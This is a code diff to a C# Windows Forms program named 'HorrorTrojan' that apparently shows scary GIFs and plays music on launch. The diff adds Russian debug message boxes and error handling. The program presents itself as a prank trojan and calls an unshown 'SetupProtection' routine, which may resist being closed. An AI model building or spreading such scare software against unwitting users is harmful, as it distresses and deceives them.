@@ -49,25 +49,38 @@ namespace HorrorTrojan
 
         public MainInterface()
         {
+            MessageBox.Show("Конструктор формы", "Debug", MessageBoxButtons.OK, MessageBoxIcon.Information);
             InitializeComponent();
             this.Load += MainInterface_Load;
+            this.Show();
+            this.BringToFront();
+            MessageBox.Show("Форма создана и показана", "Debug", MessageBoxButtons.OK, MessageBoxIcon.Information);
         }
 
         private void MainInterface_Load(object sender, EventArgs e)
         {
-            if (!Directory.Exists(appDataPath))
-                Directory.CreateDirectory(appDataPath);
+            MessageBox.Show("Загрузка формы начата", "Debug", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            try
+            {
+                if (!Directory.Exists(appDataPath))
+                    Directory.CreateDirectory(appDataPath);
 
-            ExtractMediaFile("hr.gif");
-            ExtractMediaFile("dv.mp3");
-            ExtractMediaFile("vd.gif");
-            ExtractMediaFile("kj.gif");
-            ExtractMediaFile("kf.gif");
+                ExtractMediaFile("hr.gif");
+                ExtractMediaFile("dv.mp3");
+                ExtractMediaFile("vd.gif");
+                ExtractMediaFile("kj.gif");
+                ExtractMediaFile("kf.gif");
 
-            LoadResources();
-            StartTimers();
-            SetupProtection();
-            PlayMusic();
+                LoadResources();
+                StartTimers();
+                SetupProtection();
+                PlayMusic();
+                MessageBox.Show("Все ресурсы загружены", "Debug", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show($"Ошибка: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
         }
 
         private void ExtractMediaFile(string fileName)
@@ -235,11 +248,9 @@ namespace HorrorTrojan
                     return;
                 }
 
-                // ОТДЕЛЬНАЯ ФОРМА ДЛЯ GIF (как в NoSleep)
                 VideoForm videoForm = new VideoForm(videoPath);
                 videoForm.Show();
 
-                // Закрываем через 5 секунд
                 var closeThread = new Thread(() =>
                 {
                     Thread.Sleep(5000);
